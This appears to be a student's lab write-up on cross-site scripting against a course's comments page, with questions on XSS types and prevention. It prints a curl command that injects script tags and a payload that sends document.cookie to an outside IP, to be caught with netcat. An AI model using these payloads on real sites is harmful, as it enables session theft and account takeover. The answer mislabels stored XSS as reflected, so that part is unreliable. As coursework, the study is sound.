@@ -1,0 +1,75 @@
+Question1:
+
+part1:
+
+For this part, there are two localhosts of which are comments and admin. 
+For the comments part, it contains html file inside which is empty at firts. 
+After inserting some data, comments are aded into the file, to add I used such command;
+
+curl -d "comment=<script type=text/javascript>document.cookie="A"</script>" -X POST https://austmann.netsec.seclab-bonn.de/group-11/comments
+
+With this, we can post http into the localhost. After adding scripts, gtml file looks like this;
+
+(Entire code is on quest1.html file)
+...
+    <input type="submit" value="Submit comment">
+  </form>
+  <h2>Previous Comments</h2>
+
+  <div class="comment">
+    <script type=text/javascript>document.location=https://austmann.netsec-bonn.de/group-11/comments </script>
+  </div>
+
+  <div class="comment">
+    <script type=text/javascript>document.cookie=A</script>
+  </div>
+
+</body>
+</html>
+
+So, we can inject javascript code into the comments in which we can define document cookie, 
+location etc. Unfortunately, even if I use some different types of the codes, 
+I could not find the vm cookie that I could not use browser and netcat -lvp 80 commands 
+to store the cookie from specifying rules of php file into txt file. If I scan do it, 
+I can get into admin localhost by using curl option with cookie property. 
+Here, injection xss attack works like injection javascript or some script code 
+into the body part of the html file. After executing the url, it also executes the malicious data 
+like showing alert, redirecting another url etc, also printing cookie into the file, 
+then getting user and password to get the admin panel. 
+
+
+part2:
+
+
+What kind of XSS attack did you execute in part 1?
+
+Even if I tried and could not handled the attack, I used reflected xss because 
+I tried to change the input handling with malicious data. After adding comments into list, 
+and if I succeded to seize the cookie, "new Image().src="http://10.3.3.111/b.php?"+document.cookie;" 
+and "netcat -lvp 80" by listening and getting the answer of the cookie, I would have enter 
+one of the curl method to get into secret by cookie data. 
+
+What other types of XSS attacks do you know? Briefly describe them.
+
+There are three types of xss attacs exits of which are stored xss, reflected xss and less known 
+dom based xss. Stored xss is used when permanent changes occur as stored in target server like database. 
+Victim receives changed data from the server and browser renders with this data. Reflected xss occurs 
+when immediate changes happen like input or search requests rendered in the browser. 
+data flow from source to sink is in the DOM and data flow never exit from the browser mostly in the 
+client-side code and malicious data is executed.  
+
+How can XSS attacks be prevented?
+
+Input handling needs to be safe if we want to avoid malicious data infection. Encoding can provide to 
+escape user input becoming as data instead of code. htmp escape, encoding client-side are some examples. 
+Validation filters the user input as code not a command. Classification strategy such as blacklisting
+ and whitelisting not to submit all javascripts, validation outcome with rejection by some inputs 
+and sanitisaiton by removing invalid inputs are also validation usage. Contex can secure input, inbound 
+and outbound secure when retrieve input or before insert. Client and server also can secure the input handling. 
+
+References:
+
+1- https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting
+
+
+
